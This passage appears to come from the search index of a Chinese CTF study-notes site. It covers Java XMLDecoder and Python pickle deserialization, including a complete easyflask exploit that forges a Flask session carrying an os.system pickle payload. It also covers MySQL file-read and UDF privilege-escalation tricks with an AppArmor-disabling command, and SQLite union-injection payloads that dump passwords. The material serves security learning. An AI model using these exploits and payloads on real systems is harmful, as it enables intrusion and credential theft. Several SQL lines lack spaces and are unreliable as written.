<p>1.\u51fa\u73b0\u95ee\u9898\u7684\u539f\u56e0\u662f\u5b50\u7c7b\u4e2d\u7684\u67d0\u4e2a\u65b9\u6cd5\u6ca1\u6709\u91cd\u5199\uff0c\u5bfc\u81f4\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\u5e76\u4e14\u62fc\u63a5\u5199\u5165\u4e86\u5bf9\u5e94\u7684\u6570\u636e\u4e2d</p> <p>2.\u6f0f\u6d1e\u539f\u7406\u662fJAVA\u5bf9XML\u6587\u4ef6\u7684\u89e3\u6790\u662f\u5206\u6bb5\u5206\u5f00\u7684\uff0c\u5229\u7528\u89e3\u6790\u8fc7\u7a0b\u4e2d\u8c03\u7528\u5230\u7684creat\u548cgetvalue\u7684\u62fc\u63a5\u80fd\u591f\u5f97\u5230\u60f3\u8981\u7684\u6570\u636e\u3002</p> <p>3.\u4e0d\u6e05\u695a\u662f\u5426\u8fd8\u6709\u5176\u4ed6\u7684\u5165\u53e3\uff0c\u4f46\u8fd9\u91cc\u7684\u5173\u952e\u8bed\u53e5\u5176\u5b9e\u662f\uff1a</p> <pre><code>\u00a0 \u00a0 \u00a0 \u00a0 Object o = xmlDecoder.readObject();\n</code></pre>"},{"location":"web/serialize/java/xmldecoder/#_2","title":"\u7f16\u8f91\uff1a\u5f90\u5f00\u8c6a","text":""},{"location":"web/serialize/java/xmldecoder/#_3","title":"\u5ba1\u6838\uff1a\u5f90\u5f00\u8c6a","text":""},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Python Pickle\u53cd\u5e8f\u5217\u5316","text":""},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#picklecpickle","title":"Pickle/CPickle","text":"<p><code>pickle</code>\u6216<code>cPickle</code>\uff0c\u4f5c\u7528\u548c<code>PHP\u7684serialize\u4e0eunserialize</code>\u4e00\u6837\uff0c\u4e24\u8005\u53ea\u662f\u5b9e\u73b0\u7684\u8bed\u8a00\u4e0d\u540c\uff0c\u4e00\u4e2a\u662f\u7eafPython\u5b9e\u73b0\u3001\u53e6\u4e00\u4e2a\u662fC\u5b9e\u73b0\uff0c\u51fd\u6570\u8c03\u7528\u57fa\u672c\u76f8\u540c\uff0c\u4f46cPickle\u5e93\u7684\u6027\u80fd\u66f4\u597d,\u4e4b\u540e\u5c31\u4ee5pickle\u5e93\u6765\u8fdb\u884c\u6f14\u793a\u3002</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pickle","title":"Pickle\u5e93\u53ca\u51fd\u6570","text":"<p>pickle\u662fpython\u8bed\u8a00\u7684\u4e00\u4e2a\u6807\u51c6\u6a21\u5757\uff0c\u5b9e\u73b0\u4e86\u57fa\u672c\u7684\u6570\u636e\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u3002  pickle\u6a21\u5757\u662f\u4ee5\u4e8c\u8fdb\u5236\u7684\u5f62\u5f0f\u5e8f\u5217\u5316\u540e\u4fdd\u5b58\u5230\u6587\u4ef6\u4e2d\uff08\u4fdd\u5b58\u6587\u4ef6\u7684\u540e\u7f00\u4e3a<code>.pkl</code>\uff09\uff0c\u4e0d\u80fd\u76f4\u63a5\u6253\u5f00\u8fdb\u884c\u9884\u89c8\u3002</p> <pre><code>#\u5e8f\u5217\u5316\npickle.dump(obj, file, protocol=None,)\nobj\u8868\u793a\u8981\u8fdb\u884c\u5c01\u88c5\u7684\u5bf9\u8c61(\u5fc5\u586b\u53c2\u6570\uff09\nfile\u8868\u793aobj\u8981\u5199\u5165\u7684\u6587\u4ef6\u5bf9\u8c61\n\u4ee5\u4e8c\u8fdb\u5236\u53ef\u5199\u6a21\u5f0f\u6253\u5f00\u5373wb(\u5fc5\u586b\u53c2\u6570\uff09\n#\u53cd\u5e8f\u5217\u5316\npickle.load(file, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None)\nfile\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5c01\u5b58\u540e\u7684\u5bf9\u8c61\n\u4ee5\u4e8c\u8fdb\u5236\u53ef\u8bfb\u6a21\u5f0f\u6253\u5f00\u5373rb(\u5fc5\u586b\u53c2\u6570)\n#\u5e8f\u5217\u5316\npickle.dumps(obj, protocol=None,*,fix_imports=True)\ndumps()\u65b9\u6cd5\u4e0d\u9700\u8981\u5199\u5165\u6587\u4ef6\u4e2d\uff0c\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5e8f\u5217\u5316\u7684bytes\u5bf9\u8c61\u3002\n#\u53cd\u5e8f\u5217\u5316\npickle.loads(bytes_object, *,fix_imports=True, encoding=\"ASCII\". errors=\"strict\")\nloads()\u65b9\u6cd5\u662f\u76f4\u63a5\u4ecebytes\u5bf9\u8c61\u4e2d\u8bfb\u53d6\u5e8f\u5217\u5316\u7684\u4fe1\u606f\uff0c\u800c\u975e\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u3002\n\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n\u7248\u6743\u58f0\u660e\uff1a\u672c\u6587\u4e3aCSDN\u535a\u4e3b\u300cSn0w/\u300d\u7684\u539f\u521b\u6587\u7ae0\uff0c\u9075\u5faaCC 4.0 BY-SA\u7248\u6743\u534f\u8bae\uff0c\u8f6c\u8f7d\u8bf7\u9644\u4e0a\u539f\u6587\u51fa\u5904\u94fe\u63a5\u53ca\u672c\u58f0\u660e\u3002\n\u539f\u6587\u94fe\u63a5\uff1ahttps://blog.csdn.net/qq_43431158/article/details/108919605\n</code></pre> <pre><code>import pickle\nimport os\nclass A(object):\n    def __init__(self,a,b):\n        self.a=a\n        self.b=b\nif __name__ == '__main__':\n    AA = A('1','2')\n    print(AA)\n    print('-----------------------------------------')\n\n    strings = pickle.dumps(AA)\n    print(strings)\n    print(\"\u5e8f\u5217\u5316\u540e\")\n    print('-----------------------------------------')\n    data = pickle.loads(strings)\n    print(data)\n    print(\"\u53cd\u5e8f\u5217\u5316\")\n    print('-----------------------------------------')\n</code></pre> <p>\u7136\u540e\u6267\u884c\u51fa\u6765\u7684\u7ed3\u679c\uff08py3\u88ab\u7f16\u7801\uff0c\u66f4\u4e3a\u76f4\u89c2\uff0c\u5efa\u8bae\u91c7\u7528py2\uff09\uff1a</p> <p></p> <p></p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pvm","title":"PVM","text":"<p>\u5bf9\u4e8ePython\u800c\u8a00\uff0c\u5b83\u53ef\u4ee5\u76f4\u63a5\u4ece\u6e90\u4ee3\u7801\u8fd0\u884c\u7a0b\u5e8f\u3002Python\u89e3\u91ca\u5668\u4f1a\u5c06\u6e90\u4ee3\u7801\u7f16\u8bd1\u4e3a\u5b57\u8282\u7801\uff0c\u7136\u540e\u5c06\u7f16\u8bd1\u540e\u7684\u5b57\u8282\u7801\u8f6c\u53d1\u5230Python\u865a\u62df\u673a\u4e2d\u6267\u884c\u3002\u603b\u7684\u6765\u8bf4\uff0cPVM\u7684\u4f5c\u7528\u4fbf\u662f\u7528\u6765\u89e3\u91ca\u5b57\u8282\u7801\u7684\u89e3\u91ca\u5f15\u64ce\u3002</p> <p>\u7406\u89e3\u8d77\u6765\u5c31\u662f\u7c7b\u4f3c\u865a\u62df\u673a\u4e2d\u7f16\u8bd1\u6267\u884cpy\u7a0b\u5e8f</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pickle-pvm","title":"Pickle\u662f\u4e00\u95e8\u57fa\u4e8e\u6808\u7684\u7f16\u7a0b\u8bed\u8a00 , \u6709\u4e0d\u540c\u7684\u7f16\u5199\u65b9\u5f0f , \u5176\u672c\u8d28\u5c31\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684 PVM .","text":"<p>\u6458\u81ea\u7f51\u7edc\uff1a</p> <pre><code>c : \u8bfb\u53d6\u672c\u884c\u7684\u5185\u5bb9\u4f5c\u4e3a\u6a21\u5757\u540dmodule, \u8bfb\u53d6\u4e0b\u4e00\u884c\u7684\u5185\u5bb9\u4f5c\u4e3a\u5bf9\u8c61\u540dobject\uff0c\u7136\u540e\u5c06 module.object \u4f5c\u4e3a\u53ef\u8c03\u7528\u5bf9\u8c61\u538b\u5165\u5230\u6808\u4e2d\n( : \u5c06\u4e00\u4e2a\u6807\u8bb0\u5bf9\u8c61\u538b\u5165\u5230\u6808\u4e2d , \u7528\u4e8e\u786e\u5b9a\u547d\u4ee4\u6267\u884c\u7684\u4f4d\u7f6e . \u8be5\u6807\u8bb0\u5e38\u5e38\u642d\u914d t \u6307\u4ee4\u4e00\u8d77\u4f7f\u7528 , \u4ee5\u4fbf\u4ea7\u751f\u4e00\u4e2a\u5143\u7ec4\nS : \u540e\u9762\u8ddf\u5b57\u7b26\u4e32 , PVM\u4f1a\u8bfb\u53d6\u5f15\u53f7\u4e2d\u7684\u5185\u5bb9 , \u76f4\u5230\u9047\u89c1\u6362\u884c\u7b26 , \u7136\u540e\u5c06\u8bfb\u53d6\u5230\u7684\u5185\u5bb9\u538b\u5165\u5230\u6808\u4e2d\nt : \u4ece\u6808\u4e2d\u4e0d\u65ad\u5f39\u51fa\u6570\u636e , \u5f39\u5c04\u987a\u5e8f\u4e0e\u538b\u6808\u65f6\u76f8\u540c , \u76f4\u5230\u5f39\u51fa\u5de6\u62ec\u53f7 . \u6b64\u65f6\u5f39\u51fa\u7684\u5185\u5bb9\u5f62\u6210\u4e86\u4e00\u4e2a\u5143\u7ec4 , \u7136\u540e , \u8be5\u5143\u7ec4\u4f1a\u88ab\u538b\u5165\u6808\u4e2d\nR : \u5c06\u4e4b\u524d\u538b\u5165\u6808\u4e2d\u7684\u5143\u7ec4\u548c\u53ef\u8c03\u7528\u5bf9\u8c61\u5168\u90e8\u5f39\u51fa , \u7136\u540e\u5c06\u8be5\u5143\u7ec4\u4f5c\u4e3a\u53ef\u8c03\u7528\u53c2\u6570\u7684\u5bf9\u8c61\u5e76\u6267\u884c\u8be5\u5bf9\u8c61 \u3002\u6700\u540e\u5c06\u7ed3\u679c\u538b\u5165\u5230\u6808\u4e2d\n. : \u7ed3\u675f\u6574\u4e2a Pickle \u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\n</code></pre> <p></p> <p></p> <p>\u6574\u4e2a\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u6b65\u9aa4</p> <ol> <li>\u4ece\u5bf9\u8c61\u4e2d\u63d0\u6743\u6240\u6709\u5c5e\u6027</li> <li>\u5199\u5165\u5bf9\u8c61\u7684\u6240\u6709\u6a21\u5757\u540d\u548c\u7c7b\u540d</li> <li>\u5199\u5165\u5bf9\u8c61\u6240\u6709\u5c5e\u6027\u7684\u952e\u503c\u5bf9</li> </ol> <p>\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u5c31\u662f\u5e8f\u5217\u5316\u8fc7\u7a0b\u7684\u9006\u8fc7\u7a0b\u3002</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#picklecpickle_1","title":"Pickle/CPickle\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790","text":"<p>\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u51fa\u73b0\u5728 <code>__reduce__()</code>\u9b54\u6cd5\u51fd\u6570\u4e0a\uff0c\u8fd9\u4e00\u70b9\u548cPHP\u4e2d\u7684<code>__wakeup()</code> \u9b54\u672f\u65b9\u6cd5\u7c7b\u4f3c\uff0c\u90fd\u662f\u56e0\u4e3a\u6bcf\u5f53\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u5f00\u59cb\u6216\u8005\u7ed3\u675f\u65f6 , \u90fd\u4f1a\u81ea\u52a8\u8c03\u7528\u8fd9\u7c7b\u51fd\u6570\u3002\u800c\u8fd9\u6070\u597d\u662f\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7ecf\u5e38\u51fa\u73b0\u7684\u5730\u65b9\u3002</p> <p>\u800c\u4e14\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\uff0c\u56e0\u4e3a\u7f16\u7a0b\u8bed\u8a00\u9700\u8981\u6839\u636e\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u53bb\u89e3\u6790\u51fa\u81ea\u5df1\u72ec\u7279\u7684\u8bed\u8a00\u6570\u636e\u7ed3\u6784\uff0c\u6240\u4ee5\u5c31\u5fc5\u987b\u8981\u5728\u5185\u90e8\u628a\u89e3\u6790\u51fa\u6765\u7684\u7ed3\u6784\u53bb\u6267\u884c\u4e00\u4e0b\u3002\u5982\u679c\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u95ee\u9898\uff0c\u4fbf\u53ef\u80fd\u76f4\u63a5\u9020\u6210RCE\u6f0f\u6d1e.</p> <p>\u53e6\u5916pickle.loads\u4f1a\u89e3\u51b3import \u95ee\u9898\uff0c\u5bf9\u4e8e\u672a\u5f15\u5165\u7684module\u4f1a\u81ea\u52a8\u5c1d\u8bd5import\u3002\u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4\u6574\u4e2apython\u6807\u51c6\u5e93\u7684\u4ee3\u7801\u6267\u884c\u3001\u547d\u4ee4\u6267\u884c\u51fd\u6570\u90fd\u53ef\u4ee5\u8fdb\u884c\u4f7f\u7528\u3002 https://docs.python.org/3.7/library/pickle.html</p> <p></p> <p>\u5c06\u4e4b\u524d\u538b\u5165\u6808\u4e2d\u7684\u5143\u7ec4\u548c\u53ef\u8c03\u7528\u5bf9\u8c61\u5168\u90e8\u5f39\u51fa , \u7136\u540e\u5c06\u8be5\u5143\u7ec4\u4f5c\u4e3a\u53ef\u8c03\u7528\u53c2\u6570\u7684\u5bf9\u8c61\u5e76\u6267\u884c\u8be5\u5bf9\u8c61 \u3002\u6700\u540e\u5c06\u7ed3\u679c\u538b\u5165\u5230\u6808\u4e2d </p> <p>\u4e8b\u5b9e\u4e0a , <code>R</code>\u64cd\u4f5c\u7801\u5c31\u662f <code>__reduce__()</code> \u9b54\u672f\u51fd\u6570\u7684\u5e95\u5c42\u5b9e\u73b0 . \u800c\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u7ed3\u675f\u7684\u65f6\u5019 , Python \u8fdb\u7a0b\u4f1a\u81ea\u52a8\u8c03\u7528 <code>__reduce__()</code> \u9b54\u672f\u65b9\u6cd5 . \u5982\u679c\u53ef\u4ee5\u63a7\u5236\u88ab\u8c03\u7528\u51fd\u6570\u7684\u53c2\u6570 , Python \u8fdb\u7a0b\u5c31\u53ef\u4ee5\u6267\u884c\u6076\u610f\u4ee3\u7801 .</p> <p>\u5728python2\u4e2d\u53ea\u6709\u5185\u7f6e\u7c7b\u624d\u6709<code>__reduce__</code>\u65b9\u6cd5\uff0c\u5373\u7528<code>class A(object)</code>\u58f0\u660e\u7684\u7c7b\uff0c\u800c<code>python3</code>\u4e2d\u5df2\u7ecf\u9ed8\u8ba4\u90fd\u662f\u5185\u7f6e\u7c7b\u4e86</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","title":"\u6f0f\u6d1e\u53ef\u80fd\u51fa\u73b0\u7684\u4f4d\u7f6e","text":"<ol> <li> <p>\u89e3\u6790\u8ba4\u8bc1token\u3001session\u7684\u65f6\u5019</p> </li> <li> <p>\u5c06\u5bf9\u8c61Pickle\u540e\u5b58\u50a8\u6210\u78c1\u76d8\u6587\u4ef6</p> </li> <li> <p>\u5c06\u5bf9\u8c61Pickle\u540e\u5728\u7f51\u7edc\u4e2d\u4f20\u8f93</p> </li> <li> <p>\u53c2\u6570\u4f20\u9012\u7ed9\u7a0b\u5e8f</p> </li> </ol> <p>\u4ec0\u4e48\u53ebRCE\u554a</p> <pre><code>import pickle\nimport os\n\nclass Test2(object):\n    def __reduce__(self):\n        #\u88ab\u8c03\u7528\u51fd\u6570\u7684\u53c2\u6570\n        cmd = \"ls\" \n        return (os.system,(cmd,))\n\nif __name__ == \"__main__\":\n    test = Test2()\n    #\u6267\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\n    result1 = pickle.dumps(test)\n    #\u6267\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\n    result2 = pickle.loads(result1)\n\n# __reduce__()\u9b54\u6cd5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c:\n# return(os.system,(cmd,))\n# 1.\u6ee1\u8db3\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4\uff0c\u5143\u7ec4\u4e2d\u6709\u4e24\u4e2a\u53c2\u6570\n# 2.\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u88ab\u8c03\u7528\u51fd\u6570 : os.system()\n# 3.\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5143\u7ec4:(cmd,),\u5143\u7ec4\u4e2d\u88ab\u8c03\u7528\u7684\u53c2\u6570 cmd\n# 4. \u56e0\u6b64\u5e8f\u5217\u5316\u65f6\u88ab\u89e3\u6790\u6267\u884c\u7684\u4ee3\u7801\u662f os.system(\"/usr/bin/id\")\n</code></pre> <p></p> <p>\u8fd9\u4e2a\u4ee3\u7801\u6267\u884c\u6bd4Java\u53cd\u5e8f\u5217\u5316\u8981\u5bb9\u6613\u5f88\u591a</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#hfctf-2021-finaleasyflask","title":"[HFCTF 2021 Final]easyflask","text":"<p>\u4e0d\u653e\u5b8c\u5168\u7684\u9898\u89e3\u4e86\uff1a</p> <pre><code>#!/usr/bin/python3.6\nimport os\nimport pickle\n\nfrom base64 import b64decode\nfrom flask import Flask, request, render_template, session\n\napp = Flask(__name__)\napp.config[\"SECRET_KEY\"] = \"*******\"\n\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 0,\n    '__repr__': lambda o: o.uname,\n})\n\n\n@app.route('/', methods=('GET',))\ndef index_handler():\n    if not session.get('u'):\n        u = pickle.dumps(User())\n        session['u'] = u\n    return \"/file?file=index.js\"\n\n\n@app.route('/file', methods=('GET',))\ndef file_handler():\n    path = request.args.get('file')\n    path = os.path.join('static', path)\n    if not os.path.exists(path) or os.path.isdir(path) \\\n            or '.py' in path or '.sh' in path or '..' in path or \"flag\" in path:\n        return 'disallowed'\n\n    with open(path, 'r') as fp:\n        content = fp.read()\n    return content\n\n\n@app.route('/admin', methods=('GET',))\ndef admin_handler():\n    try:\n        u = session.get('u')\n        if isinstance(u, dict):\n            u = b64decode(u.get('b'))\n        u = pickle.loads(u)\n    except Exception:\n        return 'uhh?'\n\n    if u.is_admin == 1:\n        return 'welcome, admin'\n    else:\n        return 'who are you?'\n\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80, debug=False)\n</code></pre> <p>paylaod:</p> <pre><code>import base64\nimport pickle\nfrom flask.sessions import SecureCookieSessionInterface\nimport re\nimport pickletools\nimport requests\n\nurl=\"\"\n\ndef get_secret_key():\n    target = url + \"/file/?file=/proc/self/environ\"\n    r = requests.get(target)\n    key = re.findall('key=(.*?)OLDPWD',r.text)\n    return  str(key[0])\nsecret_key = get_secret_key()\n\nclass FakeApp:\n    secret_key =secret_key\nclass User(object):\n    def __reduce__(self):\n        import os\n        cmd = \"cat /flag &gt; /tmp/test1\"\n        return  (os.system,(cmd,))\nexp = {\"b\":base64.b64encode(pickle.dumps(User()))}\n\nprint(exp)\nfake_app=FakeApp()\nsession_interface = SecureCookieSessionInterface()\nserialize = session_interface.get_signing_serializer(fake_app)\ncookie = serialize.dumps({'u':exp})\nprint(cookie)\n\nheaders = {\n    \"Accept\":\"*/*\",\n    \"Cookie\":\"session{0}\".format(cookie)\n}\nreq = requests.get(url+\"/admin\",headers=headers)\n\nreq = requests.get(url+\"/file?file=/tmp/test1\",headers=headers)\nprint(req.text)\n</code></pre>"},{"location":"web/sql/little_trick/","title":"little trick","text":""},{"location":"web/sql/little_trick/#_1","title":"\u7279\u6b8a\u5b57\u7b26","text":"<pre><code>&lt;?php\nmysql_connect(\"localhost\",\"root\",\"root\");\nmysql_select_db (\"test\");\nmysql_query(\"set names utf8\");\nfor($i = 0 ; $i &lt; 256 ; $i++){\n    $c = chr($i);\n    $name = mysql_real_escape_string('hehe' . $c);\n    $sql = \"SELECT * FROM `name` WHERE `name` = '{$name}'\";\n    $row = mysql_fetch_array(mysql_query($sql));\n    if ($row['name'] == 'aa') {\n        echo \"{$c} &lt;br/&gt;\";\n    }\n}\nPlain Text\n</code></pre> <p>\u4e00\u4e2a\u5c0ftrick</p> <p>\u81ea\u5df1\u8dd1\u4e00\u8dd1\u5c31\u77e5\u9053\u662f\u4ec0\u4e48\u610f\u601d\u4e86</p> <p>mysql\u67e5\u8be2\u51fa\u6765\u7684\u6570\u636e\u6bd4\u5982$id</p> <p>$id=a</p> <p>$id=a+\u4efb\u610f\u4e0b\u56fe\u91cc\u9762\u7684\u5b57\u7b26</p> <p></p> <p></p>"},{"location":"web/sql/little_trick/#mysql","title":"mysql\u4efb\u610f\u6587\u4ef6\u8bfb","text":"<p>\u539f\u7406\uff1a</p> <p>\u5f53\u670d\u52a1\u7aef\u6267\u884cload data local infile\u65f6\uff0c\u4f1a\u4ece\u5ba2\u6237\u7aef\u4f1a\u8bfb\u53d6\u5bf9\u5e94\u7684\u6587\u4ef6\u3002 //load data infile\u5219\u662f\u4ece\u670d\u52a1\u7aef\u672c\u8eab\u8bfb\u53d6</p> <ol> <li> <p>mysql\u5ba2\u6237\u7aef\u8fde\u63a5\u670d\u52a1\u7aef\u65f6\uff0c\u670d\u52a1\u7aef\u53ef\u4ee5\u8ba9\u5ba2\u6237\u7aef\u6267\u884csql\u8bed\u53e5\uff0c</p> </li> <li> <p>\u6240\u4ee5\u4f2a\u9020\u4e00\u4e2a\u670d\u52a1\u7aef\uff0c\u8ba9\u5ba2\u6237\u7aef\u8fde\u63a5\u5e76\u6267\u884cload data local infile\u5373\u53ef\u4efb\u610f\u6587\u4ef6\u8bfb\u3002</p> </li> </ol> <p>https://github.com/ev0A/Mysqlist</p> <p>\u4f8b\u5b50: phpmyadmin\u5f00\u542f\u8fdc\u7a0b\u767b\u9646\u540e\u5c31\u4f1a\u51fa\u73b0\u8be5\u6f0f\u6d1e\uff08\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8eweb\u7684sql\u7ba1\u7406\u8f6f\u4ef6\uff09</p>"},{"location":"web/sql/little_trick/#udf","title":"udf\u63d0\u6743","text":"<p>\u8fd9\u4e2a\u6211\u4e0d\u4f1a\uff0c\u6240\u4ee5copy\u4e0b\u6765\u4e86</p> <p>\u5982\u679c\u7406\u89e3\u4e0d\u4e86\u53ef\u4ee5\u7c7b\u6bd4\u4e4b\u524d\u6240\u63cf\u8ff0\u7684linux\u4e0b\u7684ld_preload</p> <p>\u5927\u81f4\u6d41\u7a0b\u5982\u4e0b\uff0c\u5c06udf\u6587\u4ef6windows\u4e3adll\u6587\u4ef6 ,linux\u4e3aso\u6587\u4ef6\u5bfc\u5165\u670d\u52a1\u5668mysql\u63d2\u4ef6\u76ee\u5f55\u5373\u53ef\u3002</p> <p>\u53ef\u4ee5\u81ea\u5df1\u5199\u4e00\u4e9budf\u6587\u4ef6\u6765\u7f16\u8bd1\u3002</p> <p>\u63a8\u8350sqlmap\u63d0\u4f9b\u7684udf\u6587\u4ef6</p> <p>https://github.com/sqlmapproject/sqlmap/tree/master/data/udf</p> <p>\u56e0\u4e3audf\u6587\u4ef6\u8f83\u5927\uff0c\u8be6\u7ec6\u70b9\u51fb\u8fd9\u91cc</p> <p>https://files.cnblogs.com/files/kagari/udf.js</p> <p>\u9ad8\u7248\u672c\u4e2dmysql\u65e0\u6cd5\u5411/usr\u76ee\u5f55\u5199\u6587\u4ef6\uff0c\u53ef\u4ee5\u5bfc\u5165\u5230/tmp\uff0c\u4e4b\u540emv\u5230/usr/lib/mysql/plugin\u4e0b</p> <p>\u5bfc\u5165\u6210\u529f\u4e4b\u540e\uff0c\u5982\u679c\u6267\u884c\u547d\u4ee4\u4e3a\u7a7a\uff0c\u5219\u4eca\u513f\u53c2\u8003https://www.cyberciti.biz/faq/ubuntu-linux-howto-disable-apparmor-commands/</p> <pre><code>\u6267\u884cln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqldservice mysql restart\nPlain Text\n</code></pre>"},{"location":"web/sql/sqlite/","title":"sqlite","text":"<p>SQLite \u662f\u4e00\u4e2a\u8f6f\u4ef6\u5e93\uff0c\u5b9e\u73b0\u4e86\u81ea\u7ed9\u81ea\u8db3\u7684\u3001\u65e0\u670d\u52a1\u5668\u7684\u3001\u96f6\u914d\u7f6e\u7684\u3001\u4e8b\u52a1\u6027\u7684 SQL \u6570\u636e\u5e93\u5f15\u64ce\u3002SQLite \u662f\u5728\u4e16\u754c\u4e0a\u6700\u5e7f\u6cdb\u90e8\u7f72\u7684 SQL \u6570\u636e\u5e93\u5f15\u64ce\u3002SQLite \u6e90\u4ee3\u7801\u4e0d\u53d7\u7248\u6743\u9650\u5236\u3002</p> <p>sqlite\u662f\u8f7b\u91cf\u7ea7\u7684\u6570\u636e\u5e93\uff0c\u5728\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u7ecf\u5e38\u88ab\u4f7f\u7528\uff0c\u5f00\u53d1\u5b8c\u6210\u4e4b\u540e\u624d\u8f6c\u6362\u4e3amysql</p>"},{"location":"web/sql/sqlite/#_1","title":"\u8bed\u6cd5","text":"<p>\u56e0\u4e3a\u6211\u4e5f\u6728\u6709\u7cfb\u7edf\u7684\u5b66\u4e60\u8fc7\uff0c\u53ea\u80fd\u751f\u642c\u4e86</p>"},{"location":"web/sql/sqlite/#sqlite_master","title":"sqlite_master","text":"<p>sqlite_master\u8868\u4e2d\u4fdd\u5b58\u6570\u636e\u5e93\u8868\u7684\u5173\u952e\u4fe1\u606f\u3002</p> <p>\u4ecesqlite_master\u67e5\u8868\u540d:</p> <p>sqlite&gt;selecttbl_namefromsqlite_masterwheretype='table';</p> <p>\u7c7b\u4f3c\u662fmysql\u4e2d\u7684information-schema\u5143\u6570\u636e\u5e93\u7684\u4fe1\u606f\u3002</p> <p>\u67e5\u7248\u672c\u3002</p> <p>\u67e5\u8868\u540d\u548c\u5b57\u6bb5</p> <pre><code>0' union select1,2,sqlite_version();\n0' union select 1,2,sql from sqlite_master;\nor\n0' union select 1,2,sql from sqlite_masterwhere type='table';\nor\n0' union select 1,2,sqlfrom sqlite_master where type='table' and name='user_data';\nPlain Text\n</code></pre> <p>\u591a\u6761\u8bb0\u5f55\u65f6\u53ef\u4ee5\u4f7f\u7528group_concat\u805a\u5408\u6216\u8005\u4f7f\u7528limit</p> <pre><code>0' union select 1,2,group_concat(tbl_name)FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --\nPlain Text\n</code></pre> <p>\u6216\u8005\u4f7f\u7528limit\u6765\u8f93\u51fa\u4e00\u884c\u7ed3\u679c</p> <pre><code>0' union select1,2,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like'sqlite_%' limit 2 offset 1 --\nPlain Text\n</code></pre> <p>\u53e6\u5916\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684payload\u83b7\u53d6\u5230\u683c\u5f0f\u5316\u8fc7\u7684\u5217\u540d\uff1a</p> <pre><code>0' union select1,2,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')+1)),instr((substr(sql,instr(sql,'(')+1)),'`')),\"TEXT\",''),\"INTEGER\",''),\"AUTOINCREMENT\",''),\"PRIMARYKEY\",''),\"UNIQUE\",''),\"NUMERIC\",''),\"REAL\",''),\"BLOB\",''),\"NOTNULL\",''),\",\",'~~') from sqlite_master where type='table' andname='user_data' --\nPlain Text\n</code></pre> <p>\u67e5\u6570\u636e</p> <pre><code>0' union selectid,name,passwd from user_data;\nPlain Text\n</code></pre> <p>\u4f7f\u7528group_concat\u8fde\u63a5\u67e5\u8be2\u7ed3\u679c</p> <pre><code>0' union select1,2,group_concat(passwd) from user_data;\nPlain Text\n</code></pre> <p>\u5728\u521b\u5efa\u8868\u65f6\u53ef\u4ee5\u7528as\u6765\u590d\u5236\u53e6\u4e00\u4e2a\u8868\u4e2d\u7684\u6570\u636e\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u53ef\u4ee5\u7528as select sql from sqlite_master\u6765\u590d\u5236sqlite_master\u7684sql\u5b57\u6bb5\u3002</p> <p>\u5177\u4f53\u53c2\u8003\uff1a</p> <p>sqlite\u6ce8\u5165\u7684\u4e00\u70b9\u603b\u7ed3 - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/8627</p>"},{"location":"web/sql/sqlite/#sqlite-bypass","title":"Sqlite bypass","text":"<p>\u76ee\u524d\u5c31\u78b0\u5230\u8fd9\u4e00\u4e2a\uff0c\u800c\u4e14\u7406\u89e3\u8d77\u6765\u6709\u70b9\u9ebb\u70e6</p> 